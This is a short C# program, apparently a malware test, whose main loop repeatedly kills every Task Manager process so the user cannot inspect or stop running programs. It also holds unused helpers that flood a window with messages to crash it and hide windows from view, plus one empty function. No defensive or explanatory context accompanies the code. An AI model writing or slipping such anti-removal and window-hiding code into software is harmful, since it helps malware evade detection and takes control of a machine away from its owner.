using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace test_antiprocess
{
    internal class Program
    {
        [DllImport("user32.dll")]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr intPtr, IntPtr lParam);

        private const uint WM_CLOSE = 0x0010;

        static void CrashWindow(IntPtr handle)
        {
            for (int i = 0; i < 1000; i++)
            {
                SendMessage(handle, 0xFFFF, IntPtr.Zero, IntPtr.Zero);
            }
        }

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0; // Command to hide window
        private const int SW_SHOW = 5; // Command to show window

        static void ShowForm(IntPtr handle)
        {
            
        }
        static void HideForm(IntPtr handle)
        {
            ShowWindow(handle, SW_HIDE);
        }

        static void Main(string[] args)
        {
            while (true)
            {
                foreach (Process p in Process.GetProcessesByName("taskmgr"))
                {
                    p.Kill();
                }
            }
        }
    }
}
